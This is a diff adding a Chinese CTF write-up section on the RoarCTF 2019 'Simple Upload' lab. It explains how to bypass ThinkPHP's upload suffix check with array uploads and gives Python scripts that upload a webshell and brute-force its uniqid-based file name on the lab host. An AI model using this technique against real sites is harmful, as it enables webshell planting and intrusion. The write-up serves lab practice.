@@ -706,7 +706,69 @@ Content-Type: image/jpeg
 
 ### [RoarCTF 2019]Simple Upload
 
+前置知识点：
 
+>   thinkPHP默认上传路径：`/home/index/upload`
+>
+>   thinkphp默认路由为pathinfo路径形式 →`http://网址/index.php/分组/控制器/操作方法`
+>
+>   Think PHP upload()多文件上传：
+>
+>   think PHP里的upload()函数在不传参的情况下是批量上传的，这里可以理解为防护机制只会检测一次，运用条件竞争，多次上传便可以绕过文件后缀的检测。
+>
+>   ThinkPHP 上传文件名爆破：
+>
+>    这里的后缀命名方式运用了uniqid函数它是基于微秒的当前时间来更改文件名的，两个同时上传生成的文件名相差不会太远。先上传一个正常文件再上传一个木马文件，然后再上传一个正常文件，然后根据第一和第三个正常文件的文件名之间的差异，爆破出我们上传的木马文件名。
 
+![image-20220124212712918](README/image-20220124212712918.png)
 
+```python
+import requests
+url = 'http://7bf59f19-55d2-4237-ba35-ccb808a150f1.node4.buuoj.cn:81/index.php/Home/Index/upload'
+file1 = {'file': open('D://1.txt', 'r')}
+file2 = {'file[]': open('D://1.txt', 'r')}  # upload()不传参时即是批量上传所以用[]
+r = requests.post(url, files=file1)
+print(r.text)
+r = requests.post(url, files=file2)
+print(r.text)
+r = requests.post(url, files=file1)
+print(r.text)
+```
+
+这里可以看到两个文件之间是有6位数的不同，接下来我们只要控制这六位数爆破文件名即可
+
+```python
+
+import time
+import requests
+
+# 获取正常上传后文件路径名
+url = "http://7bf59f19-55d2-4237-ba35-ccb808a150f1.node4.buuoj.cn:81/index.php/home/index/upload"
+file1 = {'file': open('D:\\1.txt', 'r')}
+file2 = {'file[]': open('D:\\1.txt', 'r')}
+file3 = {'file': open('D:\\1.txt', 'r')}
+# r = requests.post(url, files=file1)
+# print(r.text)
+# r = requests.post(url, files=file2)
+# print(r.text)
+# r = requests.post(url, files=file3)
+# print(r.text)
+
+# 爆破
+dir = 'abcdef0123456789'
+for i in dir:
+    for j in dir:
+        for x in dir:
+            for y in dir:
+                for z in dir:
+                    url = 'http://7bf59f19-55d2-4237-ba35-ccb808a150f1.node4.buuoj.cn:81/Public/Uploads/2021-03-03/61eeaef{}{}{}{}{}.php'.format(
+                        i, j, x, y, z)
+                    r = requests.get(url)
+                    # print(url)
+                    time.sleep(2)
+                    if r.status_code == 200:
+                        print(url)
+                        break
+
+```
 
